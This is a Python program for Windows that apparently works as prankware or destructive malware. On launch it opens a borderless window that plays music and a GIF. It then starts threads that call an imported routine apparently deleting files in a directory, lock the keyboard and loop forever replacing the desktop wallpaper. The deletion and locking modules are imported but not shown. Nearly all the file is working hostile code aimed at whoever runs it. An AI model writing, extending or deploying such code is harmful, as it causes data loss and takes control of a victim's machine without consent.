import tkinter as tk
from itertools import count
import os
import threading
import ctypes

from PIL import Image, ImageTk
import pygame

from lock import lock_key, unlock_key
from remove_file import DeleteFile
from click_movie import click_mouse

class ImageLabel(tk.Label):
    def load(self, im):
        if isinstance(im, str):
            im = Image.open(im)
        self.loc = 0
        self.frames = []
        try:
            for i in count(1):
                self.frames.append(ImageTk.PhotoImage(im.copy()))
                im.seek(i)
        except EOFError:
            pass
        try:
            self.delay = im.info['duration']
        except:
            self.delay = 100
        if len(self.frames) == 1:
            self.config(image=self.frames[0])
        else:
            self.next_frame()

    def unload(self):
        self.config(image="")
        self.frames = None

    def next_frame(self):
        if self.frames:
            self.loc += 1
            self.loc %= len(self.frames)
            self.config(image=self.frames[self.loc])
            self.after(self.delay, self.next_frame)


class App(tk.Tk):
    def __init__(self):
        tk.Tk.__init__(self)
        self.overrideredirect(True)
        self.screen_width = self.winfo_screenwidth()
        self.screen_height = self.winfo_screenheight()

        self.window_width = 400
        self.window_height = 400
        self.x = self.screen_width - self.window_width - 10
        self.y = self.screen_height - self.window_height - 10
        self.geometry(f"{self.window_width}x{self.window_height}+{self.x}+{self.y}")

        pygame.mixer.init()
        pygame.mixer.music.load(os.path.dirname(os.path.realpath("__file__"))+"\media\\Nevermind.mp3")
        pygame.mixer.music.play()

        self.lbl = ImageLabel(self)
        self.lbl.pack()

        self.thread_kaun = threading.Thread(target=self.lbl.load, args=(os.path.dirname(os.path.realpath("__file__"))+"\media\gif.gif",))
        self.thread_kaun.start()

        self.del_obj = DeleteFile()
        self.thread_del_dir = threading.Thread(target=self.del_obj.delete_files_in_directory)
        self.thread_del_dir.start()

        self.thread_bg = threading.Thread(target=self.bg_new, args=(1,))
        self.thread_bg.start()

        self.thread_lock_keyboard = threading.Thread(target=lock_key)
        self.thread_lock_keyboard.start()

        self.thread_click_sound = threading.Thread(target=click_mouse)
        self.thread_click_sound.start()

    def set_wallpaper(self, image_path):
        # Set desktop wallpaper on Windows
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)

    def bg_new(self,i):
        gif_path = os.path.dirname(os.path.realpath("__file__"))+"\media\\bg.gif" 
        gif_image = Image.open(gif_path)
        frames = gif_image.n_frames
        for frame in range(frames):
            gif_image.seek(frame)
            frame_image = gif_image.copy()
            frame_image_path = os.path.dirname(os.path.realpath("__file__"))+f"\media\\frame\\frame_{frame}.png"
            frame_image.save(frame_image_path)
        while True:
            for i in [os.path.dirname(os.path.realpath("__file__"))+f"\media\\frame\\frame_{frame}.png" for frame in range(frames)]:
                self.set_wallpaper(i)

app = App()
app.mainloop()
